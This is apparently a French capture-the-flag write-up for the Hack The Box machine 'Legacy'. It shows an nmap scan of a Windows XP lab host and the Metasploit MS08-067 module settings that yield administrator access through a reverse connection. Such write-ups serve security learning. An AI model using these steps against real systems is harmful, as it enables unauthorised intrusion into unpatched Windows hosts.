# Legacy [Windows] Easy

**— 1.Enumeration —**

`nmap -sS -sV -Pn 10.10.10.4`

```perl
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 17:36 EDT
Nmap scan report for 10.10.10.4
Host is up (0.016s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h33m16s, deviation: 2h07m16s, median: 4d23h03m16s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:00:ed (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-04-08T02:39:31+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.75 seconds
```

En cherchant des exploit pour les différent services nous tombons sur un exploit de samba.

MS08-067 et l’exploit de metasploit `exploit/windows/smb/ms08_067_netapi`

**— 2. Exploitation —**

`set rhosts 10.10.10.4`

`set lhosts tun0`

`run`

Il n’y a plus qu’a récupérer les 2 flags user et admin dans les répertoires, nous sommes déjà admin sur la machine.